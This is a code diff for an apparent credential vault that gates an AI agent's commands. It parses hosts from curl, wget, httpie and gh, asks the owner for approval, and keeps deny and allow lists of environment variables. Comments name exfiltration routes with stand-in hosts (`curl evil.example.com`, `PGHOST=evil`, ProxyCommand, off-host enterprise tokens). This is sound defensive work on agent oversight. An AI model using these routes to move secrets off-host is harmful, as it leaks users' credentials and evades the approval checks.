@@ -27,7 +27,12 @@
  *     interpreter is not refused: its whole command line IS the shape, shown verbatim, never «always».
  *   · THE KNOWN TOOLS (`KNOWN_TOOLS`, §8.4): default hosts, where a tool's hosts come from (URLs, scp-like targets, an ssh
  *     target, a host flag, a registry), its subcommand words, whether it honours the proxy env (P1 vault-run-egress fences
- *     on it); a tool outside the table, or one naming no host = destination UNKNOWN (said on the card, never «always»).
+ *     on it); a tool outside the table, or one naming no host = destination UNKNOWN (said on the card, never «always»). Lane
+ *     vault-agent-own (round 2): a URL tool's target written WITHOUT a scheme (`curl evil.example.com`, httpie's `:3000`), a
+ *     libpq connection string's `host=` / `hostaddr=` and a URI's host LIST (`postgresql://a,b/db`), an ATTACHED short flag
+ *     (`-hHOST`, `-oProxyCommand=…` — getopt: the first letter that takes a value takes the rest of the word) and gh's
+ *     `--hostname` / `-R HOST/OWNER/REPO` are READ as hosts; a target the shape cannot list (a curl glob, a bare number, a URL
+ *     it cannot read, curl `--expand-*`) makes the shape BLIND (`unread`).
  *   · THE SHAPE KEY (`shapeOf`, `shapeKeyOf`; decision ④): tool + flags (order-free) + hosts + entries + injection + the
  *     plain env (names AND values — lane vault-run-door: `PGHOST=evil` is another shape) + the templates' text + `--on`; a
  *     known tool's subcommand words belong to the tool, and so do the VALUES of its routing flags (`keyed`: ssh -o / -J /
@@ -40,6 +45,16 @@
  *     door (`OWN_DOORS`) / unknown / not opened for runs / too short to scrub; the conversation's grant; a remembered «always» for
  *     this shape; else a cluster ASKS every time (once / always / deny — the urgent card, 60 s) and a local instance asks the
  *     FIRST time a shape runs and allows it after one 允许 (`seen` — the owner's decision ②; still audited, still scrubbed).
+ *   · THE OWN ROAD (lane vault-agent-own — the owner 2026-10-26: 「它自己存的使用为啥还要我的允许？」): an `agent:` entry is runnable by
+ *     the conversation that made it BY CONSTRUCTION — no switch, no grant, no card (`ownsAgentEntry`: the entry's scope is that
+ *     conversation — its registered id for an entry made before this lane, its DURABLE id, the CLI session id a resumed
+ *     conversation keeps, for one made since). Provenance decides ONE thing: a value the agent PUT (it saw it) never asks; a value
+ *     the hub MINTED (the agent never saw it) asks ONCE PER HOST when a run names a host other than the one it was minted `--for`
+ *     (`awayOf` — the only leak the card can still prevent); a run whose destination cannot be told — a shell, an interpreter,
+ *     an unknown tool, a routing flag, a config file, project code, a program an agent could write, and (round 2) a known tool
+ *     whose host the table did not read (every row of the table reaches the network: no host read is not «no host») — asks
+ *     once per command SHAPE on a local instance and EVERY run on a cluster, where only a live «always» (the second password)
+ *     passes it, as for the owner's own entries. Still audited, still scrubbed.
  *   · THE SCRUBBER (`FORMS` / `FORM_ROWS` — THE ONE LIST, each form with a real tool that prints it by itself; `formsOf`,
  *     `VIEWS`, `createRunMasker`, `createMasker`, `maskText`): the value in every spelling a real producer prints becomes its
  *     placeholder. SPELLED (texts built from the value): raw; base64 (standard and URL-safe, padded or not, and the value's own
@@ -84,6 +99,7 @@ const SCHEME = 'vault://';
 const MIN_MASK_BYTES = 8;                        // a shorter value cannot be scrubbed without scrubbing ordinary text
 const CMD_MAX = 4096;                            // bytes of the command line (exit run's bound)
 const TEMPLATE_MAX = 65536;                      // bytes of one template (its text is part of the shape key)
+const TEMPLATE_CARD_MAX = 4096;                  // round 17 (item 1): the card renders a config template IN FULL up to this (under DETAIL_MAX, so a shown-in-full template never overflows the card); a larger one is shown as a one-line note and is not vouched — «always» is not offered (the card cannot show what it reads in full)
 const TIMEOUT_DEFAULT_S = 120;
 const TIMEOUT_MAX_S = 600;
 const OUTPUT_MAX_BYTES = 2 * 1024 * 1024;        // per run, the device's bound
@@ -168,6 +184,40 @@ function parseRef(s) {
 /** An agent's own entry → the conversation that owns it (its scope); any other reference → null. */
 const agentScopeOf = (ref) => { const m = ref && ref.store === 'secrets' && ref.field === 'secret' ? AGENT_ENTRY.exec(String(ref.entry)) : null; return m ? m[1] : null; };
 const placeholderOf = (ref) => `[vault:${ref && ref.label ? ref.label : String(ref || '')}]`;
+/** lane vault-agent-own: is `ref` an agent entry THIS caller made? Its scope is the conversation's registered id (an entry made
+ *  before lane vault-agent-own) or its durable id (the CLI session id — kept across a resume; every entry made since): either
+ *  spelling of the caller says yes. `caller` = { scope, conv, conversationId }: `conv` is the FORK-SAFE durable id (null for a
+ *  pending fork, which borrows its parent's) — when the caller carries it, the raw conversationId is not read. */
+const callerIdsOf = (caller) => (caller ? [caller.scope, ...(caller.conv !== undefined ? [caller.conv] : [caller.conversationId])] : []).filter((x) => typeof x === 'string' && x !== '');
+function ownsAgentEntry(ref, caller = {}) {
+  const sc = agentScopeOf(ref);
+  return !!sc && callerIdsOf(caller).includes(sc);
+}
+/** A mint's `--for <host/service>` → the host it names (lower case — no scheme, user, port or path), or null. A bare word
+ *  with no dot (`com`, a service's name) names no host: every host is then «another host» (a suffix must not cover a TLD). */
+function forHostOf(s) {
+  const m = /^(?:[a-z][a-z0-9+.-]{0,31}:\/\/)?(?:[^@\s\/?#]*@)?(\[[0-9a-f:.]+\]|[a-z0-9.-]+)/.exec(String(s == null ? '' : s).trim().toLowerCase());
+  const h = m ? m[1].replace(/\.$/, '') : '';
+  return h && h.length <= 253 && /[a-z0-9]/.test(h) && (/\.[a-z0-9-]/.test(h) || h === 'localhost' || h[0] === '[') ? h : null;
+}
+/** Is a run's `host` (a shape's: `name`, `name:port`, `*.suffix`) the host a value was minted for — or one under it? */
+function sameHost(host, forHost) {
+  const f = forHostOf(forHost), h = String(host == null ? '' : host).toLowerCase().replace(/:\d+$/, '').replace(/\.$/, '');
+  if (!f || !h) return false;
+  if (h.startsWith('*.')) { const s = h.slice(2); return f === s || f.endsWith('.' + s); }
+  return h === f || h.endsWith('.' + f);
+}
+// round 12 (MINOR): gh honours GH_TOKEN only for github.com / *.ghe.com; any other (GHES) host reads GH_ENTERPRISE_TOKEN. The
+// DOOR homes the agent's credential REFERENCE to the right env NAME for the run's pinned host (the agent names neither — see
+// runSeal.credRef / credEnvOther). `host` null (a stored value, no --for host) or not-gh ⇒ the default credential name (GH_TOKEN).
+function ghCredEnvFor(host, row) {
+  const seal = (row && row.runSeal) || {};
+  const def = seal.credRef || null, other = seal.credEnvOther || null;
+  if (!def || !other || !host) return def;
+  const h = String(host).toLowerCase().replace(/:\d+$/, '').replace(/\.$/, '');
+  const github = h === 'github.com' || h === 'api.github.com' || /(?:^|\.)ghe\.com$/.test(h);
+  return github ? def : other;
+}
 /** Every reference-shaped piece of `text` → { refs: [{ …ref, at, len, form: 'url' | 'brace' | 'file', name? }], bad: [{ at, text }] }.
  *  `form` url = `vault://…`; brace = `$VAULT{…}`; file = `$VAULT_FILE{…}` (`name` set when it names a `--file NAME`). A
  *  `vault://` / `$VAULT{` / `$VAULT_FILE{` in any letter case that does not parse is BAD — never read as plain text. */
@@ -226,18 +276,34 @@ const ENV_HIJACK = Object.freeze([
   Object.freeze({ re: /^(?:NODE_OPTIONS|NODE_PATH|PYTHONSTARTUP|PYTHONPATH|PYTHONHOME|PYTHONUSERBASE|PERL5OPT|PERL5LIB|PERLLIB|RUBYOPT|RUBYLIB|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS|JDK_JAVA_OPTIONS)$/, why: 'an interpreter would run other code first' }),
   Object.freeze({ re: /^(?:BASH_ENV|ENV|SHELLOPTS|BASHOPTS|PROMPT_COMMAND|PS4|IFS|ZDOTDIR|BASH_FUNC_\S*)$/, why: 'a shell would run other code first' }),
   Object.freeze({ re: /^(?:GIT_SSH|GIT_SSH_COMMAND|GIT_EXEC_PATH|GIT_ASKPASS|SSH_ASKPASS|GIT_PROXY_COMMAND|GIT_CONFIG\w*|EDITOR|VISUAL|PAGER|GIT_PAGER|GIT_EDITOR|MANPAGER|BROWSER|RSYNC_RSH|RSYNC_CONNECT_PROG)$/, why: 'the tool would start a program it names' }),
+  Object.freeze({ re: /^(?:GH_ENTERPRISE_TOKEN|GITHUB_ENTERPRISE_TOKEN)$/, why: 'it is a credential for an Enterprise Server host — gh would send it off the host the run was minted for' }),   // round 11 (BLOCKER): the off-host credential half of the planted-config road (gh honours it for a non-github host, bypassing the for-host check)
+  Object.freeze({ re: /^(?:SSL_CERT_FILE|SSL_CERT_DIR|GIT_SSL_CAINFO|CURL_CA_BUNDLE)$/, why: 'it points TLS trust at a CA the agent chose, so a run\'s host can be impersonated — the connection is terminated at the agent\'s cert' }),   // round 11 (BLOCKER): the TLS-termination half
   Object.freeze({ re: /^PATH$/, why: 'the tool was resolved on the agent\'s PATH; another would change what it starts' }),
 ]);
 const ENV_CONFIG = Object.freeze([   // a plain value pointing at the agent's own file is refused; a `--file NAME=…` the hub renders is not
-  Object.freeze({ re: /^(?:KUBECONFIG|CURL_HOME|WGETRC|DOCKER_CONFIG|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE|NPM_CONFIG_USERCONFIG|PIP_CONFIG_FILE|PGSERVICEFILE|PGPASSFILE|RCLONE_CONFIG|NETRC)$/i, why: 'it points the tool at a config it obeys' }),
+  Object.freeze({ re: /^(?:KUBECONFIG|CURL_HOME|WGETRC|DOCKER_CONFIG|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE|NPM_CONFIG_USERCONFIG|PIP_CONFIG_FILE|PGSERVICEFILE|PGPASSFILE|PGSYSCONFDIR|PSQLRC|RCLONE_CONFIG|HTTPIE_CONFIG_DIR|GH_CONFIG_DIR|MYSQL_HOME|NETRC)$/i, why: 'it points the tool at a config it obeys' }),   // round 2: PSQLRC (its `\!` runs a shell)
   Object.freeze({ re: /^(?:HOME|XDG_CONFIG_HOME|XDG_DATA_HOME|XDG_CACHE_HOME)$/, why: 'it moves the home a tool reads its config from' }),   // lane vault-run-door (the security review)
   Object.freeze({ re: /^(?:https?_proxy|all_proxy|no_proxy|ftp_proxy)$/i, why: 'where a run may go is the hub\'s (vault-run-egress)' }),
 ]);
-/** NAME → why it is refused, or null. `as` = 'plain' | 'env' (a value) | 'file' (a path the hub renders). */
-function envRefusedOf(name, as = 'plain') {
+/** NAME → why it is refused, or null. `as` = 'plain' | 'env' (a value) | 'file' (a path the hub renders). `row` = the tool's
+ *  KNOWN_TOOLS row: a tool that declares an env ALLOWLIST (`row.envAllow`) refuses every name but the reviewed ones + the credential. */
+function envRefusedOf(name, as = 'plain', row = null) {
   const n = String(name || '');
+  // round 12 (MAJOR): the agent's env is an ALLOWLIST, not a denylist — for a tool that declares one (gh), only the reviewed
+  // names (and the credential, as a reference) pass; the host, the config dir and the credential env NAME are the DOOR's to set,
+  // refused BY NAME; every other name (GIT_* / SSL_* / *_PROXY / LD_* / NODE_OPTIONS / GIT_ASKPASS / SSH_* / GIT_TRACE2_*) is
+  // refused WITHOUT a denylist that can go stale. (The envHijack derivation stays an ADVISORY census: no allowlist name is one.)
+  if (row && Array.isArray(row.envAllow)) {
+    const seal = row.runSeal || {};
+    const doorSets = [seal.hostEnv, seal.configDirEnv, seal.credEnvOther, 'GITHUB_TOKEN', 'GITHUB_ENTERPRISE_TOKEN'].filter(Boolean);
+    if (seal.credRef && n === seal.credRef) return as === 'env' ? null : 'the door sets the credential for the run — pass it as a vault reference, never a literal';
+    if (doorSets.includes(n)) return 'the door sets this for the run (the host, the config dir and the credential env name are the hub\'s) — the agent names none of them';
+    if (row.envAllow.includes(n) || (row.envAllowRe || []).some((p) => new RegExp(p).test(n))) return null;
+    return `it is not in ${row.name}'s reviewed env allowlist (${row.envAllow.join(', ')}${(row.envAllowRe || []).length ? ', ' + row.envAllowRe.join(', ') : ''} + the credential as a reference) — every other name is refused by name`;
+  }
   const h = ENV_HIJACK.find((r) => r.re.test(n));
   if (h) return h.why;
+  if (TOOL_ENV_HIJACK.has(n)) return 'the tool would start a program it names';   // round 7 (MAJOR 4): GH_BROWSER / GH_EDITOR / GH_PAGER (gh reads the GH_ ones FIRST) — DERIVED into the gh row's envHijack from `gh help environment`
   const c = as === 'file' ? null : ENV_CONFIG.find((r) => r.re.test(n));
   return c ? c.why : null;
 }
@@ -259,32 +325,63 @@ const INTERPRETERS = Object.freeze(['node', 'nodejs', 'deno', 'bun', 'python', '
 // ── THE KNOWN TOOLS (§8.4 — P1 vault-run-egress fences the `proxyEnv` ones) ──
 const SSH_VALUE_FLAGS = ['-b', '-c', '-D', '-E', '-e', '-F', '-I', '-i', '-J', '-L', '-l', '-m', '-O', '-o', '-p', '-P', '-Q', '-R', '-S', '-W', '-w', '-B'];
 const SSH_KEYED = ['-o', '-F', '-J', '-W', '-L', '-R', '-D', '-S'];   // lane vault-run-door: where the connection goes / what it runs (ProxyCommand) — the value is the shape
-// lane vault-use-grants round 3 (BLOCKER item 1 + MAJOR item 4): the argument-taking flags of each URL tool, DERIVED from
-// `<tool> --help all` — so a flag's VALUE (-o out.json, --cacert ca.pem, -T file, -d data, -H header) is NEVER read as a
-// positional host (round 2's dotted-positional rule stored `router.pem` as a granted host). `--url` is DELIBERATELY left
-// out so a schemeless `--url evil.example` stays a positional the target reader resolves. THE SEAM: these are
-// vault-agent-own r19's CURL_VALUE_FLAGS / WGET_VALUE_FLAGS / HTTPIE_VALUE_FLAGS verbatim (train-C merges to ONE grammar).
-const CURL_VALUE_FLAGS = ['-A', '--user-agent', '-b', '--cookie', '-c', '--cookie-jar', '-C', '--continue-at', '-d', '--data', '--data-ascii', '--data-binary', '--data-raw', '--data-urlencode', '--json', '-D', '--dump-header', '-e', '--referer', '-E', '--cert', '--cert-type', '--key', '--key-type', '--cacert', '--capath', '--ciphers', '-F', '--form', '--form-string', '-H', '--header', '-m', '--max-time', '--connect-timeout', '-o', '--output', '--output-dir', '-r', '--range', '-T', '--upload-file', '-u', '--user', '-U', '--proxy-user', '-w', '--write-out', '-X', '--request', '-y', '--speed-time', '-Y', '--speed-limit', '-z', '--time-cond', '--retry', '--retry-delay', '--retry-max-time', '--limit-rate', '--max-filesize', '--max-redirs', '--oauth2-bearer', '--aws-sigv4', '--interface', '--local-port', '-Q', '--quote', '--stderr', '--trace', '--trace-ascii', '--pinnedpubkey', '--pass', '--proto', '--proto-redir', '--variable', '--url-query', '--netrc-file', '--hsts', '--etag-save', '--etag-compare', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc'];
+// lane vault-agent-own (round 2): the flags whose VALUE is the next word, so a value is never read as a target (`curl -X POST`,
+// `wget -O out.html`); a flag missing here only makes its value look like a target — a card more, never one less
+// int361 (the vault pair, 主开发's ruling): + vault-use-grants' `--alt-svc` — its value (a cache FILE) is never read as a positional host; the flag stays keyed (opaque) too
+const CURL_VALUE_FLAGS = ['-A', '--user-agent', '-b', '--cookie', '-c', '--cookie-jar', '-C', '--continue-at', '-d', '--data', '--data-ascii', '--data-binary', '--data-raw', '--data-urlencode', '--json', '-D', '--dump-header', '-e', '--referer', '-E', '--cert', '--cert-type', '--key', '--key-type', '--cacert', '--capath', '--ciphers', '-F', '--form', '--form-string', '-H', '--header', '-m', '--max-time', '--connect-timeout', '-o', '--output', '--output-dir', '-r', '--range', '-T', '--upload-file', '-u', '--user', '-U', '--proxy-user', '-w', '--write-out', '-X', '--request', '-y', '--speed-time', '-Y', '--speed-limit', '-z', '--time-cond', '--retry', '--retry-delay', '--retry-max-time', '--limit-rate', '--max-filesize', '--max-redirs', '--oauth2-bearer', '--aws-sigv4', '--interface', '--local-port', '-Q', '--quote', '--stderr', '--trace', '--trace-ascii', '--pinnedpubkey', '--pass', '--proto', '--proto-redir', '--variable', '--url-query', '--url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--netrc-file', '--hsts', '--etag-save', '--etag-compare', '--alt-svc'];
 const WGET_VALUE_FLAGS = ['-O', '--output-document', '-o', '--output-file', '-a', '--append-output', '-P', '--directory-prefix', '-U', '--user-agent', '--header', '--user', '--password', '--http-user', '--http-password', '--post-data', '--post-file', '--body-data', '--body-file', '--method', '-t', '--tries', '-T', '--timeout', '--load-cookies', '--save-cookies', '--ca-certificate', '--certificate', '--private-key', '-w', '--wait', '-Q', '--quota', '--limit-rate', '-l', '--level', '-A', '--accept', '-R', '--reject', '-D', '--domains', '--exclude-domains', '-e', '--execute', '-B', '--base', '--bind-address', '--config', '-i', '--input-file'];
-const HTTPIE_VALUE_FLAGS = ['-a', '--auth', '-A', '--auth-type', '-o', '--output', '--session', '--session-read-only', '--cert', '--cert-key', '--cert-key-pass', '--ciphers', '--ssl', '--timeout', '--max-redirects', '--boundary', '--format-options', '-p', '--print', '-P', '--history-print', '--pretty', '-s', '--style', '--response-charset', '--response-mime', '--default-scheme', '--verify', '--raw', '--proxy'];
+const HTTPIE_VALUE_FLAGS = ['-a', '--auth', '-A', '--auth-type', '-o', '--output', '--session', '--session-read-only', '--cert', '--cert-key', '--cert-key-pass', '--ciphers', '--ssl', '--timeout', '--max-redirects', '--boundary', '--format-options', '-p', '--print', '-P', '--history-print', '--pretty', '-s', '--style', '--response-charset', '--response-mime', '--default-scheme', '--verify', '--proxy', '--raw'];
 const KNOWN_TOOLS = Object.freeze([
-  { name: 'curl', proxyEnv: true, valueFlags: ['-x', '--proxy', '--preproxy', '--proxy1.0', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '-K', '--config', ...CURL_VALUE_FLAGS], keyed: ['-x', '--proxy', '--preproxy', '--proxy1.0', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc'], configFlags: ['-K', '--config'] },   // round 3: --proxy1.0 routes like -x; --unix-socket / --abstract-unix-socket / --dns-servers / --alt-svc are destinations a grant can never name ⇒ opaque
-  { name: 'wget', proxyEnv: true, valueFlags: WGET_VALUE_FLAGS, keyed: ['-e', '--execute'], configFlags: ['--config', '-i', '--input-file'] },   // round 3: `-e http_proxy=…` sets a proxy ⇒ opaque
-  { name: 'http', aka: ['https', 'httpie'], proxyEnv: true, valueFlags: HTTPIE_VALUE_FLAGS, keyed: ['--proxy'] },
-  { name: 'gh', hosts: ['api.github.com', 'github.com'], hostEnv: ['GH_HOST'], sub: 2, proxyEnv: true, valueFlags: ['-R', '--repo', '--hostname'] },
-  { name: 'git', sub: 1, scpLike: true, proxyEnv: true, valueFlags: ['-C', '-c', '--git-dir', '--work-tree', '--namespace', '--config-env'], keyed: ['-c', '--config-env'] },
+  { name: 'curl', proxyEnv: true, bareHosts: 'all', globs: true, urlFlags: ['--url'], blindPrefixes: ['--expand-'], valueFlags: ['-x', '--proxy', '--preproxy', '--proxy1.0', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '-K', '--config', ...CURL_VALUE_FLAGS], keyed: ['-x', '--proxy', '--preproxy', '--proxy1.0', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc', '--interface'], configFlags: ['-K', '--config'], fileFlags: ['--cacert', '--capath', '-E', '--cert', '--key', '--netrc-file', '--hsts', '--etag-save', '--etag-compare'], configFileKeys: ['alt-svc', 'cacert', 'capath', 'cert', 'config', 'cookie-jar', 'crlfile', 'dump-header', 'egd-file', 'etag-compare', 'etag-save', 'hsts', 'key', 'knownhosts', 'libcurl', 'netrc-file', 'output', 'output-dir', 'proxy-cacert', 'proxy-capath', 'proxy-cert', 'proxy-crlfile', 'proxy-key', 'pubkey', 'random-file', 'ssl-sessions', 'stderr', 'trace', 'trace-ascii', 'upload-file'], configDataKeys: ['data', 'data-ascii', 'data-binary', 'header', 'json', 'proxy-header', 'write-out'], configAtNameKeys: ['data-urlencode', 'url-query', 'variable'], configCookieKeys: ['cookie'], configNetrcKeys: ['netrc', 'netrc-optional'], configRouteKeys: ['abstract-unix-socket', 'connect-to', 'dns-servers', 'doh-url', 'ipfs-gateway', 'preproxy', 'proxy', 'proxy1.0', 'resolve', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'unix-socket', 'url'], configRedirectKeys: ['interface', 'location', 'location-trusted', 'proto-redir'], configFormKeys: ['form'], configExpandPrefix: 'expand-', configShort: { K: 'config', E: 'cert', b: 'cookie', d: 'data', c: 'cookie-jar', D: 'dump-header', o: 'output', T: 'upload-file', H: 'header', F: 'form', w: 'write-out', x: 'proxy', n: 'netrc', L: 'location' } },   // round 19 (item 4): DERIVED from `curl --help all` (every <file>/<dir>/<data>@/<name=content>@/<url>@ option, both spellings; the short map pins -K/-E/-b/-d/…) and PINNED by the census in test-vault-run-model (a curl that adds a file-reading option → red by name); route directives (url/connect-to/resolve/proxy) are ROUTE HOSTS, location/proto-redir → noAlways redirect, a {{var}} host → blind   // round 3: a flag that redirects the connection off the URL's host (--alt-svc / --interface) is keyed; a value that is an agent-writable FILE (cert / ca / netrc / hsts cache) is a config class — blind unless it is the vault's own $VAULT_FILE   // int361: + vault-use-grants' --proxy1.0 (argv value/keyed — routes like -x)
+  { name: 'wget', proxyEnv: true, bareHosts: 'all', prefixOpts: true, valueFlags: WGET_VALUE_FLAGS, keyed: ['-e', '--execute', '-B', '--base', '--bind-address', '--use-askpass'], configFlags: ['--config', '-i', '--input-file', '--input-metalink'], fileFlags: ['--ca-certificate', '--certificate', '--private-key', '--load-cookies', '--save-cookies'] },   // round 3 (m2): --input-metalink fetches every URL in its file (like -i); a cert / cookie file the agent writes is a config class
+  { name: 'http', aka: ['https', 'httpie'], proxyEnv: true, bareHosts: 'first', valueFlags: HTTPIE_VALUE_FLAGS, keyed: ['--proxy'] },
+  { name: 'gh', hosts: ['api.github.com', 'github.com'], hostEnv: ['GH_HOST'], sub: 2, proxyEnv: true, valueFlags: ['-R', '--repo', '--hostname'], hostFlags: ['--hostname'], repoFlags: ['-R', '--repo'], repoEnv: ['GH_REPO'], urlArgSubs: [['api']], freeText: true, blindSubs: [['repo', 'clone'], ['repo', 'fork'], ['repo', 'sync'], ['pr', 'checkout'], ['extension', 'install'], ['extension', 'upgrade']], blindFlagSubs: [{ sub: ['pr', 'merge'], longs: ['--delete-branch'], shorts: ['-d'] }, { sub: ['repo', 'create'], longs: ['--push', '--clone'], shorts: ['-c'] }], needFlagSubs: [{ sub: ['pr', 'create'], need: ['--head', '-H'], repo: true }], runSeal: { configDirEnv: 'GH_CONFIG_DIR', hostEnv: 'GH_HOST', credRef: 'GH_TOKEN', credEnvOther: 'GH_ENTERPRISE_TOKEN', childEnv: { GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1', GIT_TERMINAL_PROMPT: '0' } }, grammarVersion: '2.102.0', toolSha256: '7469124f706944133d6a169691dd1c6c3511b12e85878d255e044e2948df4c9b', envAllow: ["GH_REPO","GH_FORCE_TTY","NO_COLOR","CLICOLOR","TERM","LANG","TZ"], envAllowRe: ["^LC_[A-Z]+$"], envHijack: ["BROWSER","EDITOR","GH_BROWSER","GH_EDITOR","GH_PAGER","GH_PATH","GIT_EDITOR","PAGER","VISUAL"], grammar: {
+      "api": {"value":["--cache","--field","--header","--hostname","--input","--jq","--method","--preview","--raw-field","--template","-F","-H","-X","-f","-p","-q","-t"],"repoValues":[],"spec":0,"host":null},
+      "config get": {"default":1},
+      "issue close": {"value":["--comment","--duplicate-of","--reason","--repo","-R","-c","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1},
+      "issue comment": {"value":["--attach","--body","--body-file","--repo","-F","-R","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--editor","--web","-e","-w"]},
+      "issue create": {"value":["--assignee","--attach","--blocked-by","--blocking","--body","--body-file","--label","--milestone","--parent","--project","--recover","--repo","--template","--title","--type","-F","-R","-T","-a","-b","-l","-m","-p","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--editor","--web","-e","-w"]},
+      "issue list": {"value":["--app","--assignee","--author","--jq","--json","--label","--limit","--mention","--milestone","--repo","--search","--state","--template","--type","-A","-L","-R","-S","-a","-l","-m","-q","-s","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+      "issue view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--web","-w"]},
+      "label list": {"value":["--jq","--json","--limit","--order","--repo","--search","--sort","--template","-L","-R","-S","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+      "org list": {"default":1},
+      "pr checks": {"value":["--interval","--jq","--json","--repo","--template","-R","-i","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--web","-w"]},
+      "pr comment": {"value":["--attach","--body","--body-file","--repo","-F","-R","-b"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--editor","--web","-e","-w"]},
+      "pr create": {"value":["--assignee","--attach","--base","--body","--body-file","--head","--label","--milestone","--project","--recover","--repo","--reviewer","--template","--title","-B","-F","-H","-R","-T","-a","-b","-l","-m","-p","-r","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--editor","--web","-e","-w"]},
+      "pr list": {"value":["--app","--assignee","--author","--base","--head","--jq","--json","--label","--limit","--repo","--search","--state","--template","-A","-B","-H","-L","-R","-S","-a","-l","-q","-s","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+      "pr status": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
+      "pr view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"urlArg":1,"launch":["--web","-w"]},
+      "release list": {"value":["--jq","--json","--limit","--order","--repo","--template","-L","-O","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
+      "release view": {"value":["--jq","--json","--repo","--template","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+      "repo list": {"default":1},
+      "repo view": {"value":["--branch","--jq","--json","--template","-b","-q","-t"],"repoValues":[],"spec":1,"host":null,"launch":["--web","-w"]},
+      "run list": {"value":["--branch","--commit","--created","--event","--jq","--json","--limit","--repo","--status","--template","--user","--workflow","-L","-R","-b","-c","-e","-q","-s","-t","-u","-w"],"repoValues":["--repo","-R"],"spec":0,"host":null},
+      "run view": {"value":["--attempt","--job","--jq","--json","--repo","--template","-R","-a","-j","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+      "run watch": {"value":["--interval","--repo","-R","-i"],"repoValues":["--repo","-R"],"spec":0,"host":null},
+      "search code": {"value":["--extension","--filename","--jq","--json","--language","--limit","--match","--owner","--repo","--size","--template","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+      "search commits": {"value":["--author","--author-date","--author-email","--author-name","--committer","--committer-date","--committer-email","--committer-name","--hash","--jq","--json","--limit","--order","--owner","--parent","--repo","--sort","--template","--tree","--visibility","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+      "search issues": {"value":["--app","--assignee","--author","--closed","--commenter","--comments","--created","--interactions","--involves","--jq","--json","--label","--language","--limit","--match","--mentions","--milestone","--order","--owner","--project","--reactions","--repo","--search-type","--sort","--state","--team-mentions","--template","--updated","--visibility","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+      "search prs": {"value":["--app","--assignee","--author","--base","--checks","--closed","--commenter","--comments","--created","--head","--interactions","--involves","--jq","--json","--label","--language","--limit","--match","--mentions","--merged-at","--milestone","--order","--owner","--project","--reactions","--repo","--review","--review-requested","--reviewed-by","--sort","--state","--team-mentions","--template","--updated","--visibility","-B","-H","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+      "search repos": {"default":1,"launch":["--web","-w"]},
+      "secret list": {"value":["--app","--env","--jq","--json","--org","--repo","--template","-R","-a","-e","-o","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
+      "ssh-key list": {"default":1},
+      "variable list": {"value":["--env","--jq","--json","--org","--repo","--template","-R","-e","-o","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
+      "workflow list": {"value":["--jq","--json","--limit","--repo","--template","-L","-R","-q","-t"],"repoValues":["--repo","-R"],"spec":0,"host":null},
+      "workflow view": {"value":["--ref","--repo","-R","-r"],"repoValues":["--repo","-R"],"spec":0,"host":null,"launch":["--web","-w"]},
+    }, passDashes: true },   // round 3: gh extension install/upgrade runs code; a verb+flag that drives git (pr merge --delete-branch, repo create --push/--clone) is blind; round 5: the gh flag knowledge is GENERATED from gh's own --help per verb (scripts/gen-gh-grammar.mjs → `grammar`; test-vault-run-model ⑤c re-runs the same parse against the live gh and diffs — a verb / value flag / bool / positional shape / hostname short drift is RED by name). shapeOf reads it: a value flag consumes its argument in ANY spelling so it is not misread as the <...repository> positional (repo edit -d x evil.com/o/r), a `spec` verb reads positionals[0] as HOST/OWNER/REPO (the table caught skill install/preview + label clone, not only repo's verbs; gh api <path> stays a path), a `host` short is --hostname (gh auth status -h evil.com), and a cluster's =value binds to the LAST letter only so an earlier git-driving bool is still set true (gh pr merge -dm=false). ROUND 6 (FAIL CLOSED — do not model cobra): the reader reads ONLY the spellings it can read with certainty and BLINDS the rest of gh. A dash BEFORE the verb words, or a verb the table does not carry, ⇒ vg null ⇒ blind (it asks — asking is cheap, a silent send is the one thing the vault must never do). So the table now carries EVERY host-reaching verb (gen-gh-grammar.mjs walks the WHOLE live tree): a `<repository>`/`<name>` positional (spec), --hostname (host), or a value the help 